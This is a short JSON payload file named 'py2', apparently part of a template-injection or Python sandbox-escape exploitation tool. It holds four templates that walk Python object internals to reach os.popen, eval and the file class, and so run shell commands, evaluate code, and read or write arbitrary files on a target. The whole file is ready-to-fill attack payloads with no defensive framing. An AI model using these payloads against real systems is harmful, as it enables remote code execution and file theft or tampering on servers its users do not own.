{
    "name": "py2",
    "payload": {
        "cmd":{
            "number": 1,
            "template": "().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['__import__']('os').popen(\"{{0}}\").read()"
        },
        "rce":{
            "number": 1,
            "template": "().__class__.__bases__[0].__subclasses__()[60].__init__.__globals__['__builtins__']['eval'](\"{{0}}\")"
        },
        "read":{
            "number": 1,
            "template": "''.__class__.__mro__[2].__subclasses__()[40]('{{0}}').read()"
        },
        "write":{
            "number": 2,
            "template": "[].__class__.__bases__[0].__subclasses__()[40]('{{0}}','w+').write(\"{{1}}\")"
        }
    }
}